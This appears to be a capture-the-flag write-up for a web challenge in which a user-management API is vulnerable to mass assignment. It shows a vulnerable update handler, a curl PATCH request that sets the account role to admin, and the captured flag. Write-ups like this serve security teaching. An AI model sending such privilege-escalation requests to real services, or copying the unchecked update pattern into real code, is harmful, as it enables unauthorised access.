# OverExposed_MU (Security Impossible CTF 2026 - Monash University, web)

OverExposed provides an API-driven user management service. Users authenticate via Bearer tokens, retrieve their account details via `/api/me`, and edit profile information via `PATCH /api/me`. Access to the privileged flag endpoint `/api/flag` requires administrative rights (`role: "admin"`).

## Auditing the API Endpoints

We register an account and inspect the response from `GET /api/me`:

```bash
curl -s http://$TARGET:$PORT/api/me -H "Authorization: Bearer $TOKEN"
```

Response JSON:
```json
{
  "id": 142,
  "email": "user@example.com",
  "note": "Standard user profile",
  "role": "user"
}
```

The API returns the internal database record for the user, including the `role` field. In the web interface, the role is read-only and cannot be altered through standard UI forms.

Next, we inspect the handler for `PATCH /api/me`. In modern Node.js and Python web applications, developers often update records by passing the request body directly into an update method:

```javascript
const allowedUpdates = req.body;
Object.assign(currentUser, allowedUpdates);
await currentUser.save();
```

When an application fails to enforce an explicit allowlist of editable properties (such as allowing only `note` or `email`), any property supplied in the request body is written directly to the underlying model. This vulnerability is known as **Mass Assignment** or **Over-Posting**.

## Privilege Escalation via Mass Assignment

To escalate privileges, we send a `PATCH` request containing `"role": "admin"` in the JSON body:

```bash
curl -s -X PATCH http://$TARGET:$PORT/api/me      -H "Authorization: Bearer $TOKEN"      -H "Content-Type: application/json"      -d '{"role": "admin"}'
```

The server responds with the updated user object:

```json
{
  "id": 142,
  "email": "user@example.com",
  "note": "Standard user profile",
  "role": "admin"
}
```

The server accepted the parameter and elevated our account to administrator.

## Capturing the Flag

With the role escalated to `admin`, we query `/api/flag` using the same session token:

```bash
curl -s http://$TARGET:$PORT/api/flag -H "Authorization: Bearer $TOKEN"
```

The endpoint validates our administrative role and returns the flag.

Solve: `solve/solve.sh`

Flag: `sictf{1c9e1b55e274e241a0124485f23afb94}`
